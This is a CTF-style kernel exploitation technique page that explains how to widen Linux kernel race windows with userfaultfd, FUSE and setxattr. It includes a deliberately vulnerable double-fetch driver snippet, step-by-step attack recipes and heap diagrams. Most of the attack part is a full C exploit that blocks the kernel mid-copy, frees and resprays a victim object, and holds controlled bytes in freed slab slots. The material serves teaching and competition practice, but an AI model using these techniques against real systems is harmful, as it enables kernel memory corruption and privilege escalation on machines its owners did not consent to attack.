---
title: "Widening the Race Window - userfaultfd, FUSE and setxattr"
category: pwn
subcategory: kernel
type: technique
tags: [kernel, userfaultfd, uffd, fuse, setxattr, race-condition, toctou, double-fetch, copy-from-user, heap-spray, uaf, msg-msg, unprivileged-userfaultfd, qemu, gdb, pwndbg]
difficulty: hard
summary: "Make the kernel block inside copy_from_user so a microsecond race becomes unbounded: userfaultfd, a FUSE filesystem, or a same-size setxattr spray."
when_to_use:
  - "A double-fetch or TOCTOU bug whose window is a few instructions"
  - "You must reclaim a freed object before the kernel touches it again"
  - "You need the kernel to pause in the middle of a copy_from_user/copy_to_user"
  - "`unprivileged_userfaultfd` is 0 and you need an alternative"
tools: [qemu, gdb, pwndbg, gcc, fusermount]
related: [kernel-slub-uaf-objects, kernel-setup-and-debug, kernel-mitigations, kernel-dirty-pipe-cow, kernel-pwn-cheatsheet]
---

## TL;DR

Kernel races in CTF are usually "free happens here, use happens two instructions
later". `userfaultfd` lets you register a user page so that when the kernel touches it
inside `copy_from_user`, the kernel **blocks** until your handler thread replies -
turning a two-instruction window into an infinite one. If `unprivileged_userfaultfd`
is disabled, a FUSE filesystem gives the same blocking read. `setxattr` is the
complementary trick: it puts controlled bytes in a kmalloc'd buffer for exactly the
duration of one syscall.

## Recognise it

- The driver copies a struct from userland twice (`copy_from_user` in a validation
  step and again in the use step) - a **double fetch**.
- A `kfree()` and a later dereference separated by a `copy_to_user` of an
  attacker-supplied pointer.
- `mutex_unlock` before the last use of an object.
- The challenge name or description mentions "race", "concurrency", "TOCTOU".

## Vulnerable code shape

```c
struct req { unsigned long size; void __user *buf; };

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    struct req *r = (struct req __user *)arg;
    unsigned long size;

    /* FETCH 1: validate */
    if (copy_from_user(&size, &r->size, sizeof size))
        return -EFAULT;
    if (size > 0x100)
        return -EINVAL;

    /* FETCH 2: use - `size` is re-read from userland and may now be huge */
    if (copy_from_user(kbuf, r->buf, r->size))     /* BUG: double fetch */
        return -EFAULT;
    return 0;
}

/* the UAF flavour */
static long vuln_read(struct file *f, unsigned long arg)
{
    /* copy_to_user faults on the user page -> the kernel sleeps here with
       `obj` still live; another thread calls CMD_FREE meanwhile */
    return copy_to_user((void __user *)arg, obj, obj->size);
}
```

## Theory

Targets: Linux 4.11+ for `userfaultfd` as used here; FUSE and `setxattr` work on
everything.

### userfaultfd

```c
int uffd = syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);
ioctl(uffd, UFFDIO_API, &api);               /* UFFD_API */
ioctl(uffd, UFFDIO_REGISTER, &reg);          /* a range, UFFDIO_REGISTER_MODE_MISSING */
/* a thread polls uffd; when the kernel or anyone touches an unmapped page in the
   range, the faulting task SLEEPS until the handler does UFFDIO_COPY/UFFDIO_ZEROPAGE */
```

Crucially this works when the *kernel* faults on the page inside `copy_from_user` /
`copy_to_user`: the kernel's page-fault handler goes down the same path and blocks the
kernel thread in an interruptible sleep. Your handler thread now has unlimited time to
free objects, spray reclaimers, and so on, before replying with `UFFDIO_COPY` and
letting the kernel continue.

Layout trick: register a two-page range and place the interesting bytes so the copy
**straddles** the boundary. The first page is resident, the second is not, so the
kernel copies the first half, faults, and blocks *in the middle of the copy* - exactly
where you want it.

`/proc/sys/vm/unprivileged_userfaultfd` = 0 disables it for non-root (default on many
distros since 5.11). Check it first.

### FUSE

Same idea without `userfaultfd`: `mmap` a file backed by a FUSE filesystem you
implement. When the kernel reads that page it issues a `READ` to your userspace
daemon, which simply does not answer until you are ready. Implement `getattr` and
`read`, have `read` wait on a pipe, then `mmap` the FUSE file and pass that address
to the vulnerable ioctl. Not gated by `unprivileged_userfaultfd`, but it needs
`fusermount` in the initramfs - often absent, so check first.

### setxattr

```c
/* fs/xattr.c: setxattr_copy */
if (size) {
    kvalue = kvmalloc(size, GFP_KERNEL);        /* kmalloc for small sizes */
    if (copy_from_user(kvalue, value, size)) { ... }
}
error = vfs_setxattr(...);                      /* fails for an unsupported name */
kvfree(kvalue);
```

So `setxattr(path, "security.x", buf, size, 0)` allocates a `size`-byte kernel buffer,
fills it with **exactly your bytes**, and frees it when the syscall returns. Uses:

- **Fill a hole with controlled data** for one syscall - perfect for a UAF where the
  kernel reads the object immediately.
- Combine with userfaultfd: point `value` at a uffd-backed page so `copy_from_user`
  blocks *after* the allocation. The kernel buffer then stays allocated and filled for
  as long as you like - the classic "setxattr + userfaultfd" hold primitive.
- Pick a name whose `vfs_setxattr` fails (`security.` on a tmpfs without the LSM) so
  the operation is side-effect free.

Equivalent hold-open primitives: `add_key`/`keyctl` (persistent, readable back),
`sendmsg` with `MSG_MORE` (holds an `sk_buff`), `msgsnd` (persistent `msg_msg`),
`io_uring` SQE buffers.

### Choosing

| you need | use |
|----------|-----|
| the kernel to stop mid-copy | userfaultfd (or FUSE if uffd is off) |
| controlled bytes in a freed slot, briefly | setxattr |
| controlled bytes in a freed slot, persistently | msgsnd / add_key |
| a window on a mutex-protected path | two threads plus `sched_setaffinity` to the same CPU |

## Attack

Double fetch, widened with userfaultfd:

1. `mmap` two pages at `PAGE`, then `munmap` the second one... actually: `mmap` the
   whole 2-page range `PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE`, register the
   **second** page with `UFFDIO_REGISTER` and never touch it, so it is missing.
2. Start the handler thread: `poll(uffd)` then, on a fault, do the exploit work and
   finish with `UFFDIO_COPY`.
3. Place `struct req` so that `req->size` is on page 1 (resident, passes validation)
   and the bytes the second `copy_from_user` reads are on page 2 (missing).
4. Call the ioctl. Fetch 1 succeeds with a small size. Fetch 2 faults on page 2 and the
   kernel **sleeps**.
5. The handler thread now: frees the object, sprays 64 reclaimers, and only then calls
   `UFFDIO_COPY` with the malicious bytes.
6. The kernel resumes and writes into the reclaimed object.

UAF reclaim, widened with setxattr + userfaultfd:

1. Trigger the driver's `kfree` so the slot is free.
2. In N threads, call `setxattr(path, "security.x", uffd_page, victim_size, 0)`.
   Each allocates a kernel buffer of the right size and then blocks in
   `copy_from_user`.
3. The freed slot is now occupied by a buffer whose contents you control (the first
   page of the straddling copy).
4. Use the dangling pointer.
5. Release the faults so the syscalls return and the buffers are freed.

## Heap state

```text
userfaultfd straddle layout

   PAGE+0x0000  [ resident page ]
                |  req.size = 0x10        <- fetch 1 reads this, passes
                |  ...
                |  first 0x08 bytes of the payload
   PAGE+0x1000  [ MISSING page, registered with uffd ]
                |  <- copy_from_user faults HERE, mid-copy

   kernel:  copy_from_user(kbuf, PAGE+0xff8, 0x100)
              copies 8 bytes from the resident page
              page fault on PAGE+0x1000
              -> handle_userfault() -> schedule()      *** KERNEL BLOCKED ***

   your handler thread:
              ioctl(devfd, CMD_FREE)         free the object
              spray_seq_operations(64)       reclaim it
              ioctl(uffd, UFFDIO_COPY, ...)  let the kernel continue

   kernel resumes: finishes the copy into the RECLAIMED object


setxattr hold-open

   thread i:  setxattr("/tmp", "security.x", UFFD_PAGE, 0x20, 0)
                kvmalloc(0x20)            <- lands in the freed kmalloc-32 slot
                copy_from_user(...)       <- blocks on the uffd page
              (buffer stays allocated, holding whatever was copied so far)

   main:      use the dangling pointer; the slot is occupied by YOUR bytes
```

## Exploit

```c
/* race.c - userfaultfd window widening + setxattr hold-open.
 * Build: gcc -static -O2 -no-pie -pthread -o exp race.c
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/xattr.h>
#include <unistd.h>

#define DEVICE "/dev/vuln"
#define CMD_ALLOC 0x1000
#define CMD_FREE  0x1001
#define CMD_WRITE 0x1003

#define PAGE_SZ 0x1000
#define SPRAY   64

struct req {
    unsigned long size;
    void *buf;
};

static int devfd = -1;
static int uffd = -1;
static char *uffd_region;          /* 2 pages: [resident][missing] */
static unsigned char late_payload[PAGE_SZ];
static volatile int fault_seen;

static void die(const char *m)
{
    perror(m);
    exit(1);
}

static void pin_cpu0(void)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof set, &set);
}

/* ---------------- userfaultfd plumbing ---------------- */

static void *uffd_handler(void *arg)
{
    struct uffd_msg msg;
    struct uffdio_copy copy;
    struct pollfd pfd = { .fd = uffd, .events = POLLIN };
    int fds[SPRAY];
    int i;

    (void)arg;
    for (;;) {
        if (poll(&pfd, 1, -1) < 0)
            die("poll(uffd)");
        if (read(uffd, &msg, sizeof msg) != sizeof msg)
            die("read(uffd)");
        if (msg.event != UFFD_EVENT_PAGEFAULT)
            continue;

        fault_seen = 1;
        printf("[+] kernel blocked at %#llx - window is now ours\n",
               (unsigned long long)msg.arg.pagefault.address);

        /* === the exploit work happens here, with the kernel asleep === */
        ioctl(devfd, CMD_FREE, NULL);                 /* free the victim */
        for (i = 0; i < SPRAY; i++)
            fds[i] = open("/proc/self/stat", O_RDONLY);   /* reclaim it */
        printf("[+] freed and resprayed while the kernel waited\n");
        /* ============================================================ */

        copy.src = (unsigned long)late_payload;
        copy.dst = msg.arg.pagefault.address & ~(unsigned long)(PAGE_SZ - 1);
        copy.len = PAGE_SZ;
        copy.mode = 0;
        copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &copy) < 0)
            die("UFFDIO_COPY");
        printf("[+] released the fault, kernel resumes into our object\n");
    }
    return NULL;
}

static void uffd_setup(void)
{
    struct uffdio_api api = { .api = UFFD_API, .features = 0 };
    struct uffdio_register reg;
    pthread_t th;

    uffd = syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd < 0)
        die("userfaultfd (check /proc/sys/vm/unprivileged_userfaultfd)");
    if (ioctl(uffd, UFFDIO_API, &api) < 0)
        die("UFFDIO_API");

    uffd_region = mmap(NULL, 2 * PAGE_SZ, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (uffd_region == MAP_FAILED)
        die("mmap");

    /* Make page 0 resident, leave page 1 missing and register it. */
    memset(uffd_region, 'A', PAGE_SZ);

    reg.range.start = (unsigned long)(uffd_region + PAGE_SZ);
    reg.range.len = PAGE_SZ;
    reg.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0)
        die("UFFDIO_REGISTER");

    memset(late_payload, 'B', sizeof late_payload);

    if (pthread_create(&th, NULL, uffd_handler, NULL) != 0)
        die("pthread_create");
}

/* ---------------- setxattr hold-open spray ---------------- */

struct hold_arg {
    const void *value;
    size_t size;
};

static void *hold_thread(void *p)
{
    struct hold_arg *a = p;

    /* "security." on a tmpfs without an LSM fails AFTER the kmalloc+copy,
     * so the buffer is allocated, filled, and then freed on return. With the
     * value pointing at a uffd page, the copy blocks and the buffer persists. */
    setxattr("/tmp", "security.x", a->value, a->size, 0);
    return NULL;
}

static void setxattr_hold(size_t size, int n)
{
    static struct hold_arg arg;
    pthread_t th;
    int i;

    arg.value = uffd_region + PAGE_SZ - 0x10;   /* straddles into the missing page */
    arg.size = size;
    for (i = 0; i < n; i++)
        if (pthread_create(&th, NULL, hold_thread, &arg) == 0)
            pthread_detach(th);
}

int main(void)
{
    struct req r;
    char *straddle;

    pin_cpu0();
    uffd_setup();

    devfd = open(DEVICE, O_RDWR);
    if (devfd < 0)
        die("open " DEVICE);

    /* Allocate the victim object. */
    r.size = 32;
    r.buf = NULL;
    if (ioctl(devfd, CMD_ALLOC, &r) < 0)
        die("CMD_ALLOC");

    /* Point the kernel at a buffer that straddles the page boundary so the
     * copy starts on the resident page and faults halfway through. */
    straddle = uffd_region + PAGE_SZ - 0x10;
    r.size = 0x100;
    r.buf = straddle;

    puts("[*] triggering the copy that will block in the kernel");
    ioctl(devfd, CMD_WRITE, &r);

    if (!fault_seen)
        puts("[-] no fault: the copy did not reach the missing page");

    /* Demonstrate the alternative primitive too. */
    setxattr_hold(32, 8);
    sleep(1);
    puts("[*] setxattr holders launched");
    return 0;
}
```

## Variants & pitfalls

- **`userfaultfd` returns EPERM.** Check `/proc/sys/vm/unprivileged_userfaultfd`; if
  it is 0, use FUSE, `setxattr` alone, or another blocking path (a `copy_to_user` into
  a full pipe, for example).
- **The fault must be inside the copy.** If the whole buffer is on the missing page,
  some paths bail out with `-EFAULT` before blocking. Always straddle.
- **One fault per page.** After `UFFDIO_COPY` the page is resident; re-arm with
  `madvise(MADV_DONTNEED)` for a second round.
- **Verify in gdb** that the kernel really is parked in `handle_userfault` - some
  copy routines fault differently.
- **Do not `printf` in the handler before the critical work** - stdio allocates.
- **`setxattr` name choice.** `user.*` on tmpfs succeeds and creates a real xattr
  (extra allocations); `security.*` usually fails late, which is what you want;
  `trusted.*` needs CAP_SYS_ADMIN and fails *before* the kmalloc - useless.
- **Pin all threads to one CPU** for per-CPU slab races, to different CPUs for a
  genuine mutex race.
- **FUSE needs `fusermount` and `CONFIG_FUSE_FS`.** Check the initramfs first.

## Debugging

```text
pwndbg> b handle_userfault
pwndbg> bt                       # confirms the kernel is parked in your fault
pwndbg> b copy_user_generic_unrolled
pwndbg> b __kmalloc
pwndbg> p $rdi
pwndbg> info threads
pwndbg> b vfs_setxattr
pwndbg> x/8gx $rsi
```

```bash
# Is userfaultfd available to us?
cat /proc/sys/vm/unprivileged_userfaultfd
# Is FUSE present in this initramfs?
ls /dev/fuse ; which fusermount ; grep -i fuse /proc/filesystems
# Watch the slab while racing (root, development only):
watch -n0.2 'grep -E "kmalloc-(32|64)" /proc/slabinfo'
```

## Tools

- `gcc -pthread -static`.
- `gdb` + `pwndbg` with a breakpoint on `handle_userfault`.
- `libfuse` if you need the FUSE route (rarely available in CTF initramfs images).

## References

- Linux `fs/userfaultfd.c`, `mm/userfaultfd.c`, `Documentation/admin-guide/mm/userfaultfd.rst`.
- Linux `fs/xattr.c` (`setxattr_copy`, `vfs_setxattr`).
